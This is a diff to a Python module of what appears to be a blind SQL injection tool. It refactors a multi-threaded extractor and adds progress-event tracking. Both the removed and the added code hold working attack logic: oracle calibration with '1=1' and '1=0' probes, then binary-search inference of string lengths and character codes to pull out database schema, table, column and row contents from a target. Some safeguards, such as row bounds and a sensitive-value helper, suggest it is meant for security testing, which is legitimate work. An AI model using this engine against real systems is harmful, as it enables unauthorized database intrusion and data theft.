@@ -1,273 +1,319 @@
 from __future__ import annotations
 
+import itertools
+import threading
 import time
-from collections.abc import Callable, Sequence
-from concurrent.futures import Future, ThreadPoolExecutor, as_completed
-from dataclasses import dataclass
+from collections.abc import Callable, Iterator, Sequence
+from contextlib import contextmanager
 from typing import TypeVar
 
-from .client import HttpClient
-from .dialects import SqlDialect
-from .models import DatabaseMap, ExtractionJob, ProbeResult, Schema, Table
-from .oracle import ResponseOracle
-
+from .extractor_core import (
+    BlindExtractor as CoreBlindExtractor,
+    CalibrationError,
+    ExtractionError,
+    ExtractorConfig,
+    protect_sensitive_value,
+)
+from .models import ExtractionJob, ProbeResult, Table
 
 T = TypeVar("T")
 R = TypeVar("R")
 
 
-class CalibrationError(RuntimeError):
-    pass
+def _job_activity(job: object) -> tuple[str, str]:
+    if isinstance(job, ExtractionJob):
+        expression = job.expression.casefold()
+        if "schema_name" in expression or "pragma_database_list" in expression:
+            slot = int(job.key) + 1 if job.key.isdigit() else job.key
+            return "Extract schema name", f"schema slot {slot}"
+        if "table_name" in expression or "sqlite_schema" in expression:
+            return "Extract table name", job.key
+        if "column_name" in expression or "pragma_table_info" in expression:
+            return "Extract column name", job.key
+        return "Extract value", job.key
+    if isinstance(job, str):
+        return "Count tables", job
+    if isinstance(job, tuple) and len(job) >= 4:
+        return "Count columns", f"{job[2]}.{job[3]}"
+    return "Concurrent task", str(job)
 
 
-class ExtractionError(RuntimeError):
-    pass
+class BlindExtractor(CoreBlindExtractor):
+    """Core extractor with typed, multi-worker activity events."""
 
+    def __init__(self, *args: object, **kwargs: object) -> None:
+        super().__init__(*args, **kwargs)
+        self._activity_counter = itertools.count(1)
+        self._activity_lock = threading.Lock()
+        self._activity_local = threading.local()
 
-@dataclass(slots=True)
-class ExtractorConfig:
-    workers: int = 4
-    max_length: int = 128
-    max_items: int = 128
-    min_char_code: int = 32
-    max_char_code: int = 126
+    def _stack(self) -> list[dict[str, object]]:
+        value = getattr(self._activity_local, "stack", None)
+        if value is None:
+            value = []
+            self._activity_local.stack = value
+        return value
 
-    def __post_init__(self) -> None:
-        if not 1 <= self.workers <= 16:
-            raise ValueError("workers must be between 1 and 16")
-        if self.max_length < 1:
-            raise ValueError("max_length must be at least 1")
-        if self.max_items < 1:
-            raise ValueError("max_items must be at least 1")
-        if not 0 <= self.min_char_code <= self.max_char_code <= 0x10FFFF:
-            raise ValueError("invalid character code range")
+    def _current(self) -> dict[str, object] | None:
+        stack = self._stack()
+        return stack[-1] if stack else None
 
+    def _payload(self, value: dict[str, object]) -> dict[str, object]:
+        return {key: item for key, item in value.items() if not key.startswith("_")}
 
-class BlindExtractor:
-    def __init__(
+    @contextmanager
+    def activity(
         self,
-        client: HttpClient,
-        oracle: ResponseOracle,
-        dialect: SqlDialect,
-        config: ExtractorConfig,
-    ) -> None:
-        self.client = client
-        self.oracle = oracle
-        self.dialect = dialect
-        self.config = config
-        self._started = time.monotonic()
-
-    def probe_condition(self, condition: str) -> ProbeResult:
-        payload = self.dialect.boolean_payload(condition)
+        operation: str,
+        target: str,
+        *,
+        detail: str = "starting",
+        kind: str = "extraction",
+    ) -> Iterator[None]:
+        with self._activity_lock:
+            identifier = f"activity:{self.events.scan_id}:{next(self._activity_counter)}"
         started = time.monotonic()
-        response = self.client.get(payload)
-        elapsed = time.monotonic() - started
-        return ProbeResult(
-            matched=self.oracle.evaluate(response),
-            status_code=response.status_code,
-            body_length=len(response.content),
-            elapsed_seconds=elapsed,
-            final_url=response.url,
-        )
+        value: dict[str, object] = {
+            "id": identifier,
+            "operation": operation,
+            "target": target,
+            "detail": detail,
+            "kind": kind,
+            "status": "running",
+            "worker": threading.current_thread().name,
+            "requests_used": self.client.requests_used,
+            "_last": 0.0,
+        }
+        stack = self._stack()
+        stack.append(value)
+        self._emit("activity.started", activity=self._payload(value))
+        try:
+            yield
+        except Exception as exc:
+            value.update(
+                status="failed",
+                detail=str(exc)[:240],
+                elapsed_seconds=round(time.monotonic() - started, 6),
+                requests_used=self.client.requests_used,
+            )
+            self._emit("activity.failed", activity=self._payload(value))
+            raise
+        else:
+            value.update(
+                status="completed",
+                elapsed_seconds=round(time.monotonic() - started, 6),
+                requests_used=self.client.requests_used,
+            )
+            self._emit("activity.completed", activity=self._payload(value))
+        finally:
+            if stack and stack[-1] is value:
+                stack.pop()
+            elif value in stack:
+                stack.remove(value)
+
+    def _activity_update(self, detail: str, *, force: bool = False, **extra: object) -> None:
+        value = self._current()
+        if value is None:
+            return
+        now = time.monotonic()
+        value.update(detail=detail, requests_used=self.client.requests_used, **extra)
+        if not force and now - float(value.get("_last", 0.0)) < 0.08:
+            return
+        value["_last"] = now
+        self._emit("activity.updated", activity=self._payload(value))
+
+    def _update_activity(self, detail: str, *, force: bool = False, **extra: object) -> None:
+        """Compatibility alias used by activity-aware extensions and tests."""
+        self._activity_update(detail, force=force, **extra)
 
     def calibrate(self) -> tuple[ProbeResult, ProbeResult]:
-        true_result = self.probe_condition("1=1")
-        false_result = self.probe_condition("1=0")
+        with self.activity(
+            "Calibrate oracle",
+            "TRUE condition",
+            detail="probing 1=1",
+            kind="oracle",
+        ):
+            true_result = self.probe_condition("1=1")
+            self._activity_update(
+                f"status {true_result.status_code}, {true_result.body_length} bytes",
+                force=True,
+            )
+        with self.activity(
+            "Calibrate oracle",
+            "FALSE condition",
+            detail="probing 1=0",
+            kind="oracle",
+        ):
+            false_result = self.probe_condition("1=0")
+            self._activity_update(
+                f"status {false_result.status_code}, {false_result.body_length} bytes",
+                force=True,
+            )
         if not true_result.matched or false_result.matched:
             raise CalibrationError(
                 "Oracle calibration failed. Expected TRUE to match and FALSE not to match. "
                 f"TRUE(status={true_result.status_code}, bytes={true_result.body_length}, "
-                f"matched={true_result.matched}); "
-                f"FALSE(status={false_result.status_code}, bytes={false_result.body_length}, "
-                f"matched={false_result.matched})."
+                f"matched={true_result.matched}); FALSE(status={false_result.status_code}, "
+                f"bytes={false_result.body_length}, matched={false_result.matched})."
             )
+        self._emit(
+            "scan.calibrated",
+            true_status=true_result.status_code,
+            true_bytes=true_result.body_length,
+            false_status=false_result.status_code,
+            false_bytes=false_result.body_length,
+        )
         return true_result, false_result
 
-    def infer_integer(self, expression: str, maximum: int) -> int:
-        if maximum < 0:
-            raise ValueError("maximum cannot be negative")
-        if self.probe_condition(f"COALESCE(({expression}), 0) > {maximum}").matched:
-            raise ExtractionError(
-                f"Inferred integer exceeds configured maximum ({maximum})."
-            )
-        low, high = 0, maximum
-        while low < high:
-            midpoint = (low + high) // 2
-            if self.probe_condition(
-                f"COALESCE(({expression}), 0) > {midpoint}"
-            ).matched:
-                low = midpoint + 1
-            else:
-                high = midpoint
-        return low
-
-    def extract_string(self, expression: str) -> str:
-        length = self.infer_integer(
-            self.dialect.length_expression(expression), self.config.max_length
+    def infer_integer_capped(self, expression: str, maximum: int) -> tuple[int, bool]:
+        self._activity_update(f"searching integer in range 0..{maximum}", maximum=maximum)
+        value, truncated = super().infer_integer_capped(expression, maximum)
+        self._activity_update(
+            f"resolved integer: {value}{' (limit reached)' if truncated else ''}",
+            force=True,
+            current=value,
+            maximum=maximum,
         )
-        characters: list[str] = []
-        for position in range(1, length + 1):
-            code_expression = self.dialect.char_code_expression(expression, position)
-            low = self.config.min_char_code
-            high = self.config.max_char_code
-            if self.probe_condition(f"({code_expression}) < {low}").matched:
-                raise ExtractionError(
-                    f"Character at position {position} is below --min-char-code ({low})."
-                )
-            if self.probe_condition(f"({code_expression}) > {high}").matched:
-                raise ExtractionError(
-                    f"Character at position {position} exceeds --max-char-code ({high})."
-                )
-            while low < high:
-                midpoint = (low + high) // 2
-                if self.probe_condition(
-                    f"({code_expression}) > {midpoint}"
-                ).matched:
-                    low = midpoint + 1
-                else:
-                    high = midpoint
-            if not self.probe_condition(f"({code_expression}) = {low}").matched:
-                raise ExtractionError(
-                    f"Unable to confirm character at position {position}."
-                )
-            characters.append(chr(low))
-        return "".join(characters)
+        return value, truncated
 
-    def _parallel_map(self, items: Sequence[T], function: Callable[[T], R]) -> list[R]:
-        if not items:
-            return []
-        workers = min(self.config.workers, len(items))
-        values: list[R | None] = [None] * len(items)
-        with ThreadPoolExecutor(
-            max_workers=workers, thread_name_prefix="blind-sqli"
-        ) as executor:
-            futures: dict[Future[R], int] = {
-                executor.submit(function, item): index
-                for index, item in enumerate(items)
-            }
-            try:
-                for future in as_completed(futures):
-                    values[futures[future]] = future.result()
-            except Exception:
-                for future in futures:
-                    future.cancel()
-                raise
-        return [value for value in values if value is not None]
+    def extract_string(self, expression: str, *, maximum_length: int | None = None) -> str:
+        created = self._current() is None
+        context = (
+            self.activity("Extract scalar value", "SQL expression")
+            if created
+            else _null_activity()
+        )
+        with context:
+            limit = maximum_length or self.config.max_length
+            self._activity_update(
+                f"measuring value length (limit {limit})", maximum=limit
+            )
+            length, truncated = self.infer_integer_capped(
+                self.dialect.length_expression(expression), limit
+            )
+            characters: list[str] = []
+            for position in range(1, length + 1):
+                self.control.checkpoint()
+                self._activity_update(
+                    f"extracting character {position}/{length}",
+                    force=True,
+                    current=position,
+                    maximum=length,
+                    unit="characters",
+                )
+                code_expression = self.dialect.char_code_expression(expression, position)
+                low = self.config.min_char_code
+                high = self.config.max_char_code
+                if self.probe_condition(f"({code_expression}) < {low}").matched:
+                    raise ExtractionError(
+                        f"Character at position {position} is below --min-char-code ({low})."
+                    )
+                if self.probe_condition(f"({code_expression}) > {high}").matched:
+                    raise ExtractionError(
+                        f"Character at position {position} exceeds --max-char-code ({high})."
+                    )
+                while low < high:
+                    midpoint = (low + high) // 2
+                    if self.probe_condition(f"({code_expression}) > {midpoint}").matched:
+                        low = midpoint + 1
+                    else:
+                        high = midpoint
+                if not self.probe_condition(f"({code_expression}) = {low}").matched:
+                    raise ExtractionError(
+                        f"Unable to confirm character at position {position}."
+                    )
+                characters.append(chr(low))
+            value = "".join(characters) + ("…" if truncated else "")
+            visible = len(characters)
+            suffix = " (truncated)" if truncated else ""
+            self._activity_update(
+                f"extracted {visible} characters{suffix}",
+                force=True,
+                current=visible,
+                maximum=length,
+                unit="characters",
+            )
+            return value
 
-    def extract_many(self, jobs: list[ExtractionJob]) -> dict[str, str]:
-        values = self._parallel_map(jobs, lambda job: self.extract_string(job.expression))
+    def _parallel_map(
+        self,
+        items: Sequence[T],
+        function: Callable[[T], R],
+        on_result: Callable[[T, R], None] | None = None,
+        activity_factory: Callable[[T, int], tuple[str, str, str]] | None = None,
+    ) -> list[R]:
+        positions = {id(item): index for index, item in enumerate(items)}
+
+        def tracked(item: T) -> R:
+            if activity_factory is None:
+                operation, target = _job_activity(item)
+                detail = "queued on worker"
+            else:
+                operation, target, detail = activity_factory(
+                    item, positions.get(id(item), 0)
+                )
+            with self.activity(operation, target, detail=detail):
+                return function(item)
+
+        return super()._parallel_map(items, tracked, on_result=on_result)
+
+    def extract_many(
+        self,
+        jobs: list[ExtractionJob],
+        *,
+        maximum_length: int | None = None,
+        on_result: Callable[[ExtractionJob, str], None] | None = None,
+        activity_operation: str | None = None,
+        activity_target: Callable[[ExtractionJob, int], str] | None = None,
+    ) -> dict[str, str]:
+        def extract(job: ExtractionJob) -> str:
+            if maximum_length is None:
+                return self.extract_string(job.expression)
+            return self.extract_string(job.expression, maximum_length=maximum_length)
+
+        factory = None
+        if activity_operation is not None:
+            factory = lambda job, index: (
+                activity_operation,
+                activity_target(job, index) if activity_target else job.key,
+                "queued on worker",
+            )
+        values = self._parallel_map(
+            jobs, extract, on_result=on_result, activity_factory=factory
+        )
         return {job.key: value for job, value in zip(jobs, values, strict=True)}
 
-    def enumerate_schemas(self) -> list[str]:
-        count = self.infer_integer(
-            self.dialect.schema_count_expression(), self.config.max_items
-        )
-        jobs = [
-            ExtractionJob(str(index), self.dialect.schema_name_expression(index))
-            for index in range(count)
-        ]
-        return list(self.extract_many(jobs).values())
-
-    def enumerate_tables(self, schema: str) -> list[str]:
-        count = self.infer_integer(
-            self.dialect.table_count_expression(schema), self.config.max_items
-        )
-        jobs = [
-            ExtractionJob(
-                str(index), self.dialect.table_name_expression(schema, index)
+    def extract_table_rows(
+        self,
+        schema: str,
+        table: Table,
+        **kwargs: object,
+    ) -> tuple[int, bool, int]:
+        with self.activity(
+            "Extract bounded rows",
+            f"{schema}.{table.name}",
+            detail="counting rows and selected columns",
+            kind="data",
+        ):
+            result = super().extract_table_rows(schema, table, **kwargs)
+            self._activity_update(
+                f"stored {result[0]} rows, {result[2]} bytes",
+                force=True,
+                current=result[0],
+                unit="rows",
             )
-            for index in range(count)
-        ]
-        return list(self.extract_many(jobs).values())
+            return result
 
-    def enumerate_columns(self, schema: str, table: str) -> list[str]:
-        count = self.infer_integer(
-            self.dialect.column_count_expression(schema, table), self.config.max_items
-        )
-        jobs = [
-            ExtractionJob(
-                str(index),
-                self.dialect.column_name_expression(schema, table, index),
-            )
-            for index in range(count)
-        ]
-        return list(self.extract_many(jobs).values())
 
-    def build_database_map(self, *, include_columns: bool = True) -> DatabaseMap:
-        """Build schema -> table -> column relationships with bounded concurrency.
+@contextmanager
+def _null_activity() -> Iterator[None]:
+    yield
 
-        Only one thread pool is active during each phase, avoiding nested executors while
-        still overlapping independent count and name extraction operations.
-        """
 
-        schema_names = self.enumerate_schemas()
-        database = DatabaseMap([Schema(name) for name in schema_names])
-        table_counts = self._parallel_map(
-            schema_names,
-            lambda schema: self.infer_integer(
-                self.dialect.table_count_expression(schema), self.config.max_items
-            ),
-        )
-
-        table_jobs: list[ExtractionJob] = []
-        table_locations: list[tuple[int, int]] = []
-        for schema_index, (schema_name, count) in enumerate(
-            zip(schema_names, table_counts, strict=True)
-        ):
-            for table_index in range(count):
-                table_jobs.append(
-                    ExtractionJob(
-                        f"s{schema_index}:t{table_index}",
-                        self.dialect.table_name_expression(schema_name, table_index),
-                    )
-                )
-                table_locations.append((schema_index, table_index))
-
-        table_names = list(self.extract_many(table_jobs).values())
-        for (schema_index, _), table_name in zip(
-            table_locations, table_names, strict=True
-        ):
-            database.schemas[schema_index].add_table(Table(table_name))
-
-        if not include_columns:
-            return database
-
-        table_references: list[tuple[int, int, str, str]] = []
-        for schema_index, schema in enumerate(database.schemas):
-            for table_index, table in enumerate(schema.tables):
-                table_references.append(
-                    (schema_index, table_index, schema.name, table.name)
-                )
-
-        column_counts = self._parallel_map(
-            table_references,
-            lambda item: self.infer_integer(
-                self.dialect.column_count_expression(item[2], item[3]),
-                self.config.max_items,
-            ),
-        )
-        column_jobs: list[ExtractionJob] = []
-        column_locations: list[tuple[int, int]] = []
-        for reference, count in zip(table_references, column_counts, strict=True):
-            schema_index, table_index, schema_name, table_name = reference
-            for column_index in range(count):
-                column_jobs.append(
-                    ExtractionJob(
-                        f"s{schema_index}:t{table_index}:c{column_index}",
-                        self.dialect.column_name_expression(
-                            schema_name, table_name, column_index
-                        ),
-                    )
-                )
-                column_locations.append((schema_index, table_index))
-
-        column_names = list(self.extract_many(column_jobs).values())
-        for (schema_index, table_index), column_name in zip(
-            column_locations, column_names, strict=True
-        ):
-            database.schemas[schema_index].tables[table_index].add_column(column_name)
-        return database
-
-    @property
-    def elapsed_seconds(self) -> float:
-        return time.monotonic() - self._started
+__all__ = [
+    "BlindExtractor",
+    "CalibrationError",
+    "ExtractionError",
+    "ExtractorConfig",
+    "protect_sensitive_value",
+]
